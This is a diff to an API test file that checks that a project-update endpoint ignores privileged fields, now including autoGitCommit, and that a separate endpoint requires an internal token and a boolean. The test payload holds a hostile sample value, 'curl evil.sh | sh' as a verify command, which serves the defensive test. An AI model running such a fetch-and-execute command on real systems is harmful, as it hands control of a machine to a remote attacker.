@@ -63,12 +63,37 @@ describe('bug e60e20aa: PUT /projects/:id is not mass-assignable', () => {
       verifyCommand: 'curl evil.sh | sh',
       projectRoot: '/etc',
       flowId: 'attacker-flow',
+      autoGitCommit: true,
     });
     expect(res.status).toBe(200);
     expect(res.body.name).toBe('Renamed');
     expect(res.body.verifyCommand).toBeUndefined();
     expect(res.body.projectRoot).toBeUndefined();
     expect(res.body.flowId).toBeUndefined();
+    // autoGitCommit decides whether the server runs `git` in a working tree, so
+    // it belongs with verifyCommand behind the internal token (contradiction C5).
+    expect(res.body.autoGitCommit).toBeUndefined();
+  });
+
+  it('auto-git-commit endpoint requires the internal token and a boolean', async () => {
+    const project = (await request(app).post('/projects').send({ name: 'AGC' })).body;
+    const unauth = await request(app).put(`/projects/${project.id}/auto-git-commit`).send({ autoGitCommit: true });
+    expect(unauth.status).toBe(401);
+
+    const token = VERIFY_TOKEN;
+    if (!token) return;
+    const badType = await request(app)
+      .put(`/projects/${project.id}/auto-git-commit`)
+      .set('x-agenfk-internal', token)
+      .send({ autoGitCommit: 'true' });
+    expect(badType.status).toBe(400);
+
+    const ok = await request(app)
+      .put(`/projects/${project.id}/auto-git-commit`)
+      .set('x-agenfk-internal', token)
+      .send({ autoGitCommit: true });
+    expect(ok.status).toBe(200);
+    expect(ok.body.autoGitCommit).toBe(true);
   });
   it('rejects a body with no allowlisted fields', async () => {
     const project = (await request(app).post('/projects').send({ name: 'NoFields' })).body;
